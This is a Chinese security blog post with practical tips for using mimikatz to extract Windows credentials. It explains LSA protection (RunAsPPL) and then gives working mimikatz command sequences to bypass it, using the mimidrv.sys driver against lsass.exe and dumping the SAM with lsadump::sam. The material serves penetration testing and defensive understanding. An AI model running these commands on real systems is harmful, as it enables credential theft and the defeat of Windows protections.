---
title: mimikatz的一些实战小技巧
url: https://www.secpulse.com/archives/190728.html
source: 安全脉搏
date: 2022-11-10
fetch_date: 2025-10-03T22:12:43.552489
---

# mimikatz的一些实战小技巧

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# mimikatz的一些实战小技巧

[Web安全](https://www.secpulse.com/archives/category/articles/web)

[TideSec](https://www.secpulse.com/newpage/author?author_id=26366)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2022-11-09

19,056

# 前言

最近在一些环境中使用mimikatz读取密码出现了些问题，简单记录下。

# 问题分类

### 1、权限

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190728-1667971893.png "null")

这种情况就属于权限不到位，虽然是管理员权限但是需要右键管理员权限启动cmd

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190728-1667971895.png "null")

权限到位就没问题。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190728-1667971897.png "null")

### 2、 LSA 保护 (RunAsPPL)

在 Windows 上防止凭据盗窃时，启用 LSA 保护应该是最简单的方式，配置起来简单又方便只需要在注册表中添加个一个值然后重新启动下即可。

#### 启用 LSA 保护 (RunAsPPL)：

（1）

打开注册表编辑器:regedit.exe。

（2）

打开"HKEY\_LOCAL\_MACHINESYSTEMCurrentControlSetControlLsa"。

（3）

添加DWORD值RunAsPPL并将其设置为1并且重启。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190728-16679718971.png "null")

现在你已经成功开启了LAS保护，mimikatz已经不能读取凭证信息。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190728-1667971900.png "null")

mimikatzprivilege::debug中的命令成功启用；SeDebugPrivilege，但是命令sekurlsa::logonpasswords失败并出现错误代码0x00000005。要想知道错误代码0x00000005的原因我们可以去查看源码。

```
HANDLE hData = NULL;DWORD pid;DWORD processRights = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
kull_m_process_getProcessIdForName(L"lsass.exe", &pid);hData = OpenProcess(processRights, FALSE, pid);
if (hData && hData != INVALID_HANDLE_VALUE) {    // if OpenProcess OK} else {    PRINT_ERROR_AUTO(L"Handle on memory");}
```

这段代码中它首先获取被调用进程的 PID，lsass.exe然后尝试使用标志和调用Win32函数来打开它（即获取进程句柄），现在他的访问被拒绝了所以我们的LSA保护成功打开了，成功阻止mimikatz读取凭证。

#### 绕过 RunAsPPL：

1、mimikatz驱动程序 它可以阻止mimikatz，然而mimikatz也可以通过自身工具进行绕过,使用数字签名的驱动程序来删除内核中 Process 对象的保护标志，但是需要文件mimidrv.sys必须位于当前文件夹中。

（1）、文件mimidrv.sys必须位于当前文件夹中。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190728-16679719001.png "null")

（2）、

```
 !+
 !processprotect /process:lsass.exe /remove
 privilege::debug
 sekurlsa::logonpasswords
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190728-1667971902.png "null")

成功读取凭证。2、SAM HKLMSAM：包含用户密码的NTLMv2哈希值 HKLMsecurity:包含缓存的域记录LSA secrets/LSA密钥 HKLMsystem-aka SYSKEY：包含可用于加密LSA secret和SAM数据库的密钥 SAM(安全账户管理器)，SAM用来存储Windows操作系统密码的数据库文件，为了避免明文密码泄露，SAM文件中保存的是明文密码经过一系列算法处理过的Hash值。mimikatz 运行 lsadump :: sam 从磁盘上的SAM读取凭据，可成功pypass LSA Protection。

```
 privilege::debug
 token::whoami
 token::elevate
 lsadump::sam
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190728-1667971905.png "null")

成果读取。

### 2、 特殊情况

没有LSA保护也不是权限问题。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190728-1667971908.png "null")

报错key import 解决起来也很简单直接用老版本mimikatz（2.1.1）就可以了，至于原因暂时不清楚。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190728-1667971910.png "null")

简单记录下几个简单的问题，主要是怕忘。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190728-1667971911.png "null")

E

N

D

**本文作者：[TideSec](newpage/author?author_id=26366)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/190728.html**](https://www.secpulse.com/archives/190728.html)

Tags: [LSA 保护](https://www.secpulse.com/archives/tag/lsa-%E4%BF%9D%E6%8A%A4)、[mimikatz](https://www.secpulse.com/archives/tag/mimikatz)、[RunAsPPL](https://www.secpulse.com/archives/tag/runasppl)

点赞：
0
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![基于AD Event日志检测哈希传递攻击](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/12/1671003502213-300x200.png)

  基于AD Event日志检测哈希传递攻击](https://www.secpulse.com/archives/193527.html "详细阅读 基于AD Event日志检测哈希传递攻击")
* [![基于AD Event日志检测LSASS凭证窃取攻击](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/12/1669961994099.png)

  基于AD Event日志检测LSASS凭…](https://www.secpulse.com/archives/192703.html "详细阅读 基于AD Event日志检测LSASS凭证窃取攻击")
* [![SystemFunction032函数的免杀研究](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/11/1669343059354-300x173.png)

  SystemFunction032函数的…](https://www.secpulse.com/archives/192216.html "详细阅读 SystemFunction032函数的免杀研究")

评论  (0)

昵称

必填
您当前尚未登录。
[登录？](https://www.secpulse.com/user_login "登录")
[注册](https://www.secpulse.com/user-register)

邮箱

必填（保密）

快来写下你的想法吧！

upload

|  |  |  |
| --- | --- | --- |
| [![]( https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/43b12cc12b9dbbe6a010c40d69088feb-300x298.png)](https://www.secpulse.com/newpage/author?author_id=26366aaa) | [TideSec ![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)](https://www.secpulse.com/newpage/author?author_id=26366) | |
| 文章数：145 | 积分： 185 |
|  | |

* [![阿波罗主机安全管理](/wp-content/themes/secpulse2017/img/product-agent.png)](https://linkage.duoyinsu.com)
* [![伏特漏洞扫描云平台](/wp-content/themes/secpulse2017/img/product-fute.png)](https://v.duoyinsu.com)

### 安全问答社区

![安全问答社区](https://www.secpulse.com/wp-content/themes/secpulse2017/img/xcx.png)

### 脉搏官方公众号

![脉搏公众号](https://www.secpulse.com/wp-content/themes/secpulse2017/img/SecPulse.png)

### 活动日程

[显示更多](https://www.secpulse.com/newpage/activity)

#### 2022-06-17

[Gdevops 全球敏捷运维峰会](https://www.bagevent.com/event/8022600?bag_track=AQMB)

#### 2022-05-12

[Mastering the Challenge！——来自The 3rd AutoCS 2022智能汽车信息安全大会的邀请函](https://autocs2022.artisan-event.com/)

#### 2021-11-18

[AutoSW 2021智能汽车软件开发大会](https://autosw2021.artisan-event.com)

#### 2021-06-27

[2021中国国际网络安全博览会...